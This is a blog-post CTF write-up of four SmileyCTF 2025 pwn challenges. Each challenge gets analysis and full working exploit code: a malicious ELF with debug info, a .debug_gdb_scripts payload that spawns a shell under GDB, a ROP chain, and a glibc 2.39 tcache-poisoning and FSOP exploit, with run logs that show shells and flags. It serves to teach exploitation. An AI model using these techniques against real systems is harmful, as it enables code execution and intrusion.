@@ -1,0 +1,826 @@
+---
+title: '[WRITE UP] - SmileyCTF 2025'
+description: 'Yet another CTF write up'
+image: '../../img/cover_photo_wup_imresizer.png'
+date: 2025-06-18
+tags: ['2025', 'PWN', 'WriteUp']
+authors: ['kdot']
+draft: false
+pinned: false
+---
+
+import Challenge from '@/components/mdx/Challenge.astro'
+
+
+## debuggable-1
+
+### Challenge Information
+<Challenge
+    authors={["unvariant"]}
+    category="pwn"
+    points={50}
+    solves={122}
+    description="AAAAAAAAAAAAAAAAAAAAAAAAA"
+    flag=".;,;.{elves_dwarves_orcs_what_is_going_to_be_next}"
+>
+</Challenge>
+
+### Analysis
+
+The challenge is written in a Python file:
+
+```py
+#!/usr/bin/python3
+
+from base64 import b64decode
+from os import memfd_create, getpid, write, environ
+from subprocess import run
+import builtins
+
+def print(*args, **kwargs):
+    builtins.print(*args, **kwargs, flush=True)
+
+data = input("elf: ").strip()
+elf = b64decode(data)
+print("got elf")
+
+pid = getpid()
+fd = memfd_create("elf")
+
+write(fd, elf)
+tmp = f"/proc/{pid}/fd/{fd}"
+
+env = environ.copy()
+env["HOME"] = "/home/ubuntu"
+handle = run(["gdb", tmp, "-ex", "list '/app/flag.txt'", "-ex", "q"], capture_output=True, check=True, encoding="utf-8", env=env, input="")
+print(handle.stdout)
+
+print("bye")
+```
+
+So basically, it takes a base64 encoded ELF file as input, decodes it, and writes it to a memory file descriptor. Then it runs GDB on that ELF file to read the contents of `/app/flag.txt` and prints the output. But remember that the challenge is run in a redpwn Docker container, which real path to the flag is `/srv/app/flag.txt`, not `/app/flag.txt`.
+
+Let's talk a little bit about the `list` command in GDB. This command will rely on something called `DWARF`, to read the symbol of the ELF file. In which `DWARF` is a standard format to save **debug symbol** inside the ELF file. And it appears when we compile a file with the `-g` option. `DWARG` is notable for the following parts:
+
+| Section | Description |
+| --- | --- |
+| `.debug_info` | Contains the main debugging entries (DIEs), including types, variables, and functions. |
+| `.debug_abbrev` | CDefines the structure of debugging entries in .debug_info to reduce redundancy. |
+| `.debug_line` | Maps machine code addresses to source file lines, used for setting breakpoints and listing code. |
+| `.debug_str` | Stores shared strings used across DWARF sections, such as names of variables, functions, and files. |
+
+
+We will see that `.debug_line` will contain the machine code address to the source file lines. So what if we change it to `/srv/app/flag.txt`? In C programming, there is a `directive` called `line` which is used to reassign the line number and source file name to the following lines of code, without changing the actual content of the file. The compiler will record this information in the debug info (DWARF) as if it were compiling a different file, on a different line. And besides, we also need to change the symbol of a function in our exploit so that the list function does not report an error when it cannot find the symbol `/app/flag.txt`
+
+### Exploit
+
+```python
+#!/usr/bin/env python3
+from pwn import *
+from base64 import b64encode
+import subprocess
+from tempfile import TemporaryDirectory
+
+context.log_level = 'debug'
+HOST = 'smiley.cat'
+PORT = 42699
+
+with TemporaryDirectory() as tmpdir:
+    flag_c = f"{tmpdir}/flag.c"
+    main_c = f"{tmpdir}/main.c"
+    obj = f"{tmpdir}/flag.o"
+    elf = f"{tmpdir}/exp.elf"
+
+    with open(flag_c, "w") as f:
+        f.write('#line 1 "/srv/app/flag.txt"\n')
+        f.write('__attribute__((used)) void dummy() {}\n')
+
+    with open(main_c, "w") as f:
+        f.write('int main() { return 0; }\n')
+
+    subprocess.run(["gcc", "-g", "-O0", "-c", flag_c, "-o", obj], check=True)
+
+    subprocess.run(["objcopy", "--redefine-sym=dummy=/app/flag.txt", obj], check=True)
+
+    subprocess.run(["gcc", "-no-pie", main_c, obj, "-o", elf], check=True)
+
+    with open(elf, "rb") as f:
+        b64_elf = b64encode(f.read())
+
+p = remote(HOST, PORT)
+p.sendlineafter(b"elf: ", b64_elf)
+output = p.recvall(timeout=5).decode(errors="ignore")
+
+print(output)
+```
+
+## debuggable-2
+
+### Challenge Information
+<Challenge
+    authors={["unvariant"]}
+    category="pwn"
+    points={102}
+    solves={75}
+    description="GDB is safe if you never run the binary right?"
+    flag="Something..."
+>
+</Challenge>
+
+### Analysis
+
+Like the previous challenge, this one is also written in a Python file:
+
+```py
+#!/usr/bin/python3
+
+from base64 import b64decode
+from os import memfd_create, getpid, write, environ
+from subprocess import run
+import builtins
+
+def print(*args, **kwargs):
+    builtins.print(*args, **kwargs, flush=True)
+
+data = input("elf: ").strip()
+elf = b64decode(data)
+print("got elf")
+
+pid = getpid()
+fd = memfd_create("elf")
+
+write(fd, elf)
+tmp = f"/proc/{pid}/fd/{fd}"
+
+env = environ.copy()
+env["HOME"] = "/home/ubuntu"
+handle = run(["gdb", tmp, "-ex", "q"], capture_output=True, check=True, encoding="utf-8", env=env, input="")
+print(handle.stdout)
+
+print("bye")
+```
+
+But the special thing here is that it will run with the script `set auto-load safe-path /`. As the files of inferior can come from untrusted source (such as submitted by an application user) gdb does not always load any files automatically. gdb provides the ‘set auto-load safe-path’ setting to list directories trusted for loading files not explicitly requested by user. Each directory can also be a shell wildcard pattern.
+
+```sh title='mainpage'
+set auto-load safe-path [directories]
+    Set the list of directories (and their subdirectories) trusted for automatic loading and execution of scripts. You can also enter a specific trusted file. Each directory can also be a shell wildcard pattern; wildcards do not match directory separator - see FNM_PATHNAME for system function fnmatch (see fnmatch). If you omit directories, ‘auto-load safe-path’ will be reset to its default value as specified during gdb compilation.
+    The list of directories uses path separator (‘:’ on GNU and Unix systems, ‘;’ on MS-Windows and MS-DOS) to separate directories, similarly to the PATH environment variable.
+```
+
+And one special thing is that for systems using file formats like ELF and COFF, when gdb loads a new object file, it looks for a special section called **.debug_gdb_scripts**. If this section exists, its contents are a list of NUL-terminated names of scripts to load. Each entry starts with a non-NULL prefix byte that specifies the type of entry, usually an extended language. GDB will look for each specified script file first in the current directory and then along the source search path, except that $cdir is not searched, since the compilation directory is not relevant to scripts. And since our safe path is `/` which means every file can be trusted, it will be easy to write a script to call the shell
+
+### Exploit
+
+```c
+#include <stdio.h>
+
+int main(int argc, char *argv[]) {
+  asm(
+  ".pushsection \".debug_gdb_scripts\", \"MS\",@progbits,1\n"
+  ".byte 4 \n"
+  ".ascii \"gdb.inlined-script\\n\"\n"
+  ".ascii \"import os\\n\"\n"
+  ".ascii \"os.system('/bin/sh')\\n\"\n"
+  ".byte 0\n"
+  ".popsection\n"
+  );
+
+  printf("hello world\n");
+}
+```
+
+More [info](https://www.ece.villanova.edu/VECR/doc/gdb/dotdebug_005fgdb_005fscripts-section.html#dotdebug_005fgdb_005fscripts-section)
+
+## babyrop
+
+### Challenge Information
+
+<Challenge
+    authors={["Eth007"]}
+    category="pwn"
+    points={114}
+    solves={70}
+    description="bopity ropity rop. the cop ran up the mop. the mop struck two, and over he flew, bopity ropity rop."
+    flag=".;,;.{aaaaaaa_(╯°□°)╯︵ ┻━┻_aaaaaaa}"
+>
+</Challenge>
+
+### Reverse Engineering
+
+We'll start with our friend `checksec`:
+
+```sh
+[*] '/mnt/e/sec/CTFs/2025/SmileyCTF/babyrop/babyrop/vuln'
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+```
+
+We can see that the binary is not stripped. Moreover, it has the following security features:
+
+- Full RELRO: This means that the GOT (Global Offset Table) is read-only after the program starts, preventing GOT overwrites.
+- No canary found: This means that stack canaries are not used, making stack buffer overflows more dangerous.
+- NX enabled: This means that the stack is non-executable, preventing execution of shellcode.
+- No PIE (0x400000): This means that the binary is not position-independent, making it easier to predict addresses.
+
+Let's dive into the binary using IDA:
+
+```c
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  char s[32]; // [rsp+0h] [rbp-20h] BYREF
+
+  setbuf(_bss_start, 0LL);
+  memset(s, 0, sizeof(s));
+  gets(s);
+  print(s);
+  return 0;
+}
+```
+
+It's simple, it reads a string from the user using `gets`, which is vulnerable to buffer overflow. The `print` function is used to print the string, but we don't have its implementation yet. Not actually, a `gets` function, it uses `read` to read the input up to 700 bytes. And the `printf` is a function pointer to `puts`.
+
+### Exploit Strategy
+
+So we can see, we don't have many gadgets to use to leak address. So that we need to use Stack Pivott to bss. My target is to leak the `stdout` address store in bss:
+
+```sh
+pwndbg> tel 0x404010
+00:0000│  0x404010 (print) —▸ 0x7ffff7c80e50 (puts) ◂— endbr64
+01:0008│  0x404018 (stdout@GLIBC_2.2.5) —▸ 0x7ffff7e1b780 (_IO_2_1_stdout_) ◂— 0xfbad2084
+02:0010│  0x404020 (completed) ◂— 0
+03:0018│  0x404028 ◂— 0
+04:0020│  0x404030 ◂— 0
+05:0028│  0x404038 ◂— 0
+06:0030│  0x404040 ◂— 0
+07:0038│  0x404048 ◂— 0
+```
+
+### Exploit
+
+```py collapse={1-36}
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwnie import *
+from subprocess import check_output
+from time import sleep
+
+context.log_level = 'debug'
+context.terminal = ["wt.exe", "-w", "0", "split-pane", "--size", "0.65", "-d", ".", "wsl.exe", "-d", "Ubuntu-22.04", "--", "bash", "-c"]
+exe = context.binary = ELF('./vuln_patched', checksec=False)
+libc = exe.libc
+
+gdbscript = '''
+init-pwndbg
+b *0x401227
+c
+'''
+
+def start(argv=[]):
+    if args.GDB:
+        p = process([exe.path] + argv, aslr=False)
+        gdb.attach(p, gdbscript=gdbscript)
+        pause()
+        return p
+    elif args.REMOTE:
+        return remote(sys.argv[1], sys.argv[2])
+    elif args.DOCKER:
+        p = remote("localhost", 5000)
+        sleep(0.5)
+        pid = int(check_output(["pidof", "-s", "/app/run"]))
+        gdb.attach(int(pid), gdbscript=gdbscript+f"\n set sysroot /proc/{pid}/root\nfile /proc/{pid}/exe", exe=exe.path)
+        pause()
+        return p
+    else:
+        return process([exe.path] + argv)
+
+
+# ==================== EXPLOIT ====================
+p = start()
+
+
+offset      = 0x20
+bss         = 0x404800
+
+gets_gadget = 0x401205
+puts_gadget = 0x401211
+
+leave_ret   = 0x401226
+pop_rbp     = 0x401181
+pop_rcx     = 0x40117e
+add_bl_dh   = 0x4010bf
+ret         = pop_rbp + 1
+
+payload = flat({
+    offset: [
+        bss-0x10,
+        gets_gadget
+    ]
+}, filler=b'A')
+
+input("Payload 1")
+sl(payload)
+
+payload = flat({
+    offset:[
+        0x404038 + 0x20,
+        gets_gadget,
+
+        0x404018 + 0x20,
+        puts_gadget,
+
+        cyclic(0x10),
+
+        bss + 0x30 + 0x20,
+        gets_gadget,
+
+    ]
+}, filler=b'B')
+
+input("Payload 2")
+sl(payload)
+
+payload = p64(bss + 0x20) + p64(leave_ret)
+payload += b'C' * 0x10
+payload += p64(bss) + p64(leave_ret)
+
+input("Payload 3")
+sl(payload)
+
+rls(3)
+libc.address = u64(rl()[:-1].ljust(0x8, b'\0')) - 0x2045c0
+success('libc base @ %#x', libc.address)
+
+rop = ROP(libc)
+pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
+
+payload = flat({
+    offset: [
+        0,
+        pop_rdi, next(libc.search(b'/bin/sh\0')),
+        ret, libc.sym.system
+    ]
+})
+
+input("Payload 4")
+sl(payload)
+
+interactive()
+```
+
+## limit
+
+### Challenge Information
+
+<Challenge
+    authors={["cope"]}
+    category="pwn"
+    points={234}
+    solves={34}
+    description="I heard you could malloc into scary places, so im adding a check to prevent that from ever happening!"
+    flag=".;,;.{1_am_4_f1ag_gr3nad3_I_am_a_f14g_gren4d3_I_4m_4_fl4g_gr3nade_aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS9wL0RJZUg3alRwaXdNLw==}"
+>
+</Challenge>
+
+### Analysis
+
+This challenge is contain a source code of a C program:
+
+```c title='limit.c'
+#include <stdlib.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <stdint.h>
+#include <fcntl.h>
+#include <malloc.h>
+
+char* chunks[0x10] = {0};
+uint16_t sizes[0x10] = {0};
+
+int main() {
+    uint64_t idx;
+    uint64_t sz;
+    char* limit;
+    setvbuf(stdin, NULL, _IONBF, 0);
+    setvbuf(stdout, NULL, _IONBF, 0);
+    free(malloc(0x418));
+    limit = (char*) sbrk(0);
+    puts("hi");
+    while (1) {
+        puts("Options:");
+        puts("1) malloc up to 0x100 bytes");
+        puts("2) free chunks and clear ptr");
+        puts("3) print chunks using puts");
+        puts("4) read to chunks with max possible size");
+        printf("> ");
+        uint option;
+        if (!scanf("%d", &option)) {
+            getchar();
+        }
+        switch (option) {
+            case 1:
+                printf("Index: ");
+                if (!scanf("%ld", &idx) || idx >= 0x10) {
+                    puts("idx < 0x10");
+                    break;
+                }
+                printf("Size: ");
+                if (!scanf("%ld", &sz) || !sz || sz > 0xf8) {
+                    puts("0 < sz <= 0xf8");
+                    break;
+                }
+                chunks[idx] = malloc(sz);
+                if (chunks[idx] > limit) {
+                    puts("hey where do you think ur going");
+                    // if (malloc_usable_size(chunks[idx])) free(chunks[idx])
+                    chunks[idx] = 0;
+                    break;
+                }
+                uint16_t usable_size = sz > 0x18 ? (sz+7&~0xf)+8 : 0x18;
+                sizes[idx] = usable_size;
+                break;
+            case 2:
+                printf("Index: ");
+                if (!scanf("%ld", &idx) || idx >= 0x10) {
+                    puts("idx < 0x10");
+                    break;
+                }
+                if (chunks[idx] == 0) {
+                    puts("no chunk at this idx");
+                    break;
+                }
+
+                free(chunks[idx]);
+                chunks[idx] = 0;
+                sizes[idx] = 0;
+                break;
+            case 3:
+                printf("Index: ");
+                if (!scanf("%ld", &idx) || idx >= 0x10) {
+                    puts("idx < 0x10");
+                    break;
+                }
+                if (!chunks[idx]) {
+                    puts("no chunk at this idx");
+                    break;
+                }
+                printf("Data: ");
+                puts(chunks[idx]);
+                break;
+            case 4:
+                printf("Index: ");
+                if (!scanf("%ld", &idx) || idx >= 0x10) {
+                    puts("idx < 0x10");
+                    break;
+                }
+                if (!chunks[idx]) {
+                    puts("no chunk at this idx");
+                    break;
+                }
+                printf("Data: ");
+                int len = read(0, chunks[idx], (uint32_t) sizes[idx]);
+                if (len <= 0) {
+                    puts("read failed");
+                    break;
+                }
+                chunks[idx][len] = 0; // Off-by-one
+                break;
+            default:
+                puts("invalid option");
+                break;
+        }
+        puts("");
+    }
+    _exit(0);
+}
+```
+
+So we can see that the program has a menu with 4 options:
+
+- **Option 1**: Allocate memory with `malloc` up to 0x100 bytes, and check if the allocated memory is greater than the current program break (the end of the heap). If it is, it will print an error message and set the pointer to `0`.
+- **Option 2**: Free the allocated memory at the specified index and set the pointer to `0`.
+- **Option 3**: Print the contents of the allocated memory at the specified index using `puts`.
+- **Option 4**: Read data from the standard input into the allocated memory at the specified index, with a maximum size of the usable size of the allocated memory. It also has an off-by-one bug, where it sets the last byte of the allocated memory to `0`.
+
+Look back to `checksec` result:
+
+```sh
+[*] '/mnt/e/sec/CTFs/2025/SmileyCTF/limit/limit/limit'
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+```
+
+We can see that the binary is not stripped, but has Full RELRO, and has PIE enabled. Moreover, this binary is compiled with `LIBC 2.39` 💀:
+
+```sh
+$ strings libc.so.6| grep GNU
+GNU C Library (Ubuntu GLIBC 2.39-0ubuntu8.4) stable release version 2.39.
+Compiled by GNU CC
+```
+
+### Exploit Strategy
+
+To exploit this challenge, we can use the following strategy:
+
+- Leak the `heap base` address by allocating a chunk, free, allocating a chunk again, and then printing the contents of the chunk using `puts`. This will give us the address of the chunk in the heap.
+- Abuse the off-by-one bug in option 4 to overwrite the size of the chunk in the `chunks` array. This will allow us to clear the `prev_inuse` bit of the next chunk, and make it consolidate it, with our `target` chunk. Once we allocate it back the `remainder` will split off that consolidated chunk into two chunks, one of which will be the `target` chunk. We can have a duplicate of the `target` chunk in the `chunks` array, which will help us to more things in the future.
+- After successfully leak the libc base address, we will try to do ROP/FSOP to get the shell. Because the binary just allow us to allocate an address that is less than `heap base`, so our target now is a `chunks array` in `.bss` section. So that we need to leak `PIE` base address.
+    -> To leak PIE base, we first need to leak  `ld` base address, then find a pointer that contains the address of `PIE` base and leak it
+- Then just target to `chunks[]` array, and do ROP/FSOP
+
+**Note that:** This is a high version of `glibc`, so we need to find a offset that stable both local and remote. We can do that by debug in the Docker
+
+### Exploit
+
+```py collapse={1-44}
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwnie import *
+from subprocess import check_output
+from time import sleep
+
+# context.log_level = 'debug'
+context.terminal = ["wt.exe", "-w", "0", "split-pane", "--size", "0.65", "-d", ".", "wsl.exe", "-d", "Ubuntu-22.04", "--", "bash", "-c"]
+exe = context.binary = ELF('./limit_patched', checksec=False)
+libc = exe.libc
+
+gdbscript = '''
+init-pwndbg
+# init-gef-bata
+dir /mnt/e/sec/CTFs/2025/SmileyCTF/limit/limit/glibc-2.39
+brva 0x1742
+brva 0x166E
+brva 0x1585
+brva 0x1445
+c
+'''
+
+def start(argv=[]):
+    if args.REMOTE:
+        return remote(sys.argv[1], sys.argv[2])
+    elif args.DOCKER:
+        p = remote("localhost", 5000)
+        sleep(0.5)
+        pid = int(check_output(["pidof", "-s", "/app/run"]))
+        gdb.attach(int(pid), gdbscript=gdbscript+f"\n set sysroot /proc/{pid}/root\nfile /proc/{pid}/exe", exe=exe.path)
+        pause()
+        return p
+    elif args.QEMU:
+        if args.GDB:
+            return process(["qemu-aarch64", "-g", "5000", "-L", "/usr/aarch64-linux-gnu", exe.path] + argv)
+        else:
+            return process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu", exe.path] + argv)
+    else:
+        return process([exe.path] + argv)
+
+def debug():
+    gdb.attach(p, gdbscript=gdbscript)
+    pause()
+
+def malloc(index, size):
+    sla(b"> ", b"1")
+    sla(b"Index: ", f"{index}".encode())
+    sla(b"Size: ", f"{size}".encode())
+
+def free(index):
+    sla(b"> ", b"2")
+    sla(b"Index: ", f"{index}".encode())
+
+def puts(index):
+    sla(b"> ", b"3")
+    sla(b"Index: ", f"{index}".encode())
+
+def read(index, data):
+    sla(b"> ", b"4")
+    sla(b"Index: ", f"{index}".encode())
+    sa(b"Data: ", data)
+
+def mangle(base, addr):
+    return (base >> 12) ^ addr
+
+# ==================== EXPLOIT ====================
+p = start()
+
+# Leak heap base
+info('Leak heap base')
+malloc(0, 0x28)
+malloc(1, 0x28)
+
+free(0)
+free(1)
+
+malloc(0, 0x28)
+malloc(1, 0x28)
+
+puts(1)
+ru(b'Data: ')
+heap_base = fixleak(rl()[:-1]) << 12
+slog('heap base @ %#x', heap_base)
+
+# Leak libc base
+info('Leak libc base')
+for i in range(9):
+    malloc(i, 0xf8)
+malloc(9, 0x18) # prevent top consolidation
+
+## Fill tcache
+for i in range(7):
+    free(i)
+
+payload = flat(
+    p64(heap_base + 0x9f0), p64(heap_base + 0x9f0), # fd/bk point to fake main arena
+    b"A" * 0x10, p64(0) * 2,
+    p64(heap_base + 0xa20), p64(heap_base + 0xa20), # Fake arena contain a pointer point back to victim chunk
+    b"B" * 0xb0,
+    p64(0x100) # fake prev_size
+)
+
+read(7, payload)
+free(8)
+
+puts(7)
+ru(b'Data: ')
+libc.address = fixleak(rl()[:-1]) - 0x203b20
+slog('libc base @ %#x', libc.address)
+
+for i in range(7):
+    malloc(i, 0xf8)
+
+malloc(15, 0xf8)
+
+# Leak ld
+info('Leak ld base')
+info('Stable address for ld base @ %#x', libc.address - 0x1df0)
+free(0)
+free(7)
+
+## _rtld_global + 2736
+# read(15, p64(mangle(heap_base, libc.address - 0x1dd0)))
+read(15, p64(mangle(heap_base, libc.address - 0x1df0))) # Work on remote
+
+malloc(7, 0xf8)
+malloc(0, 0xf8)
+
+free(7)
+
+puts(15)
+ru(b'Data: ')
+# debug()
+leak_val = u64(rl()[:-1].ljust(8, b"\x00")) ^ (heap_base >> 12)
+ld_base = (leak_val ^ (libc.address - 0x1dd0 >> 12)) - 0x38ab0 # Work on remote
+# ld_base = fixleak(rl()[:-1])
+slog('ld base @ %#x', ld_base)
+
+malloc(7, 0xf8)
+
+# Leak pie
+info('Leak pie base')
+free(1)
+free(7)
+
+read(15, p64(mangle(heap_base, ld_base + 0x39660)))
+
+malloc(7, 0xf8)
+malloc(1, 0xf8)
+
+free(7)
+
+puts(15)
+ru(b'Data: ')
+leak_val = u64(rl()[:-1].ljust(8, b"\x00")) ^ (heap_base >> 12)
+exe.address = (leak_val ^ (ld_base + 0x39660 >> 12)) - 0x658
+slog('pie base @ %#x', exe.address)
+
+malloc(7, 0xf8)
+
+# tcache poisoning (aim for chunks[] array since it below heap region) [then leak stack]
+info('Tcache poisoning & Leak stack address')
+free(2)
+free(7)
+
+# debug()
+read(15, p64(mangle(heap_base, exe.sym.chunks)))
+
+malloc(7, 0xf8)
+malloc(2, 0xf8)
+
+read(2, p64(libc.sym.environ))
+puts(0)
+ru(b'Data: ')
+stack_leak = fixleak(rl()[:-1])
+saved_rbp = stack_leak - 0x138
+slog('stack leak @ %#x', stack_leak)
+slog('saved RBP @ %#x', saved_rbp)
+
+# Do FSOP
+info('FSOP to _IO_2_1_stdout_')
+free(3)
+free(7)
+
+read(15, p64(mangle(heap_base, exe.sym.chunks)))
+
+malloc(7, 0xf8)
+malloc(0, 0xe8) # Make the size at index 0 > 0
+malloc(3, 0xf8)
+
+fp = FileStructure()
+fp.flags = 0xfbad2484 + (u32(b"||sh") << 32)
+fp._IO_read_end = libc.sym.system
+fp._lock = libc.sym._IO_2_1_stdout_ + 0x50
+fp._wide_data = libc.sym._IO_2_1_stdout_
+fp.vtable = libc.sym._IO_wfile_jumps - 0x20
+payload = bytes(fp) + p64(libc.sym._IO_2_1_stdout_ + 0x10 - 0x68)
+
+read(3, p64(libc.sym._IO_2_1_stdout_)) # Overwrite chunks[0] = _IO_2_1_stdout_
+read(0, payload)  # Write to _IO_2_1_stdout_
+
+interactive()
+# .;,;.{1_am_4_f1ag_gr3nad3_I_am_a_f14g_gren4d3_I_4m_4_fl4g_gr3nade_aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS9wL0RJZUg3alRwaXdNLw==}
+```
+
+And yes, it works both local and remote:
+
+- Local:
+
+    ```sh
+    $ ./exploit.py
+    [*] '/mnt/e/sec/CTFs/2025/SmileyCTF/limit/limit/libc.so.6'
+        Arch:       amd64-64-little
+        RELRO:      Full RELRO
+        Stack:      Canary found
+        NX:         NX enabled
+        PIE:        PIE enabled
+        FORTIFY:    Enabled
+        SHSTK:      Enabled
+        IBT:        Enabled
+        Stripped:   No
+        Debuginfo:  Yes
+    [+] Starting local process '/mnt/e/sec/CTFs/2025/SmileyCTF/limit/limit/limit_patched': pid 5709
+    [*] Leak heap base
+    [+] heap base @ 0x57bea28e9000
+    [*] Leak libc base
+    [+] libc base @ 0x715fba06a000
+    [*] Leak ld base
+    [*] Stable address for ld base @ 0x715fba068210
+    [+] ld base @ 0x715fba27e000
+    [*] Leak pie base
+    [+] pie base @ 0x57be6c311000
+    [*] Tcache poisoning & Leak stack address
+    [+] stack leak @ 0x7ffdd9656908
+    [+] saved RBP @ 0x7ffdd96567d0
+    [*] FSOP to _IO_2_1_stdout_
+    [*] Switching to interactive mode
+    sh: 1: \x84$\xad\xfb: not found
+    pwniere > ls
+    Dockerfile  flag.txt    ld-linux-x86-64.so.2  limit    limit_patched
+    exploit.py  glibc-2.39  libc.so.6             limit.c
+    ```
+
+- Remote:
+
+    ```sh
+    $ ./exploit.py REMOTE smiley.cat 46465
+    [*] '/mnt/e/sec/CTFs/2025/SmileyCTF/limit/limit/libc.so.6'
+        Arch:       amd64-64-little
+        RELRO:      Full RELRO
+        Stack:      Canary found
+        NX:         NX enabled
+        PIE:        PIE enabled
+        FORTIFY:    Enabled
+        SHSTK:      Enabled
+        IBT:        Enabled
+        Stripped:   No
+        Debuginfo:  Yes
+    [+] Opening connection to smiley.cat on port 46465: Done
+    [*] Leak heap base
+    [+] heap base @ 0x55559ca7c000
+    [*] Leak libc base
+    [+] libc base @ 0x7fd28bbb7000
+    [*] Leak ld base
+    [*] Stable address for ld base @ 0x7fd28bbb5210
+    [+] ld base @ 0x7fd28bdcd000
+    [*] Leak pie base
+    [+] pie base @ 0x555573de2000
+    [*] Tcache poisoning & Leak stack address
+    [+] stack leak @ 0x7ffeaa4da3c8
+    [+] saved RBP @ 0x7ffeaa4da290
+    [*] FSOP to _IO_2_1_stdout_
+    [*] Switching to interactive mode
+    sh: 1: \x84$\xad\xfb: not found
+    .;,;.{1_am_4_f1ag_gr3nad3_I_am_a_f14g_gren4d3_I_4m_4_fl4g_gr3nade_aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS9wL0RJZUg3alRwaXdNLw==}
+    pwniere > ls
+    flag.txt
+    run
+    ```
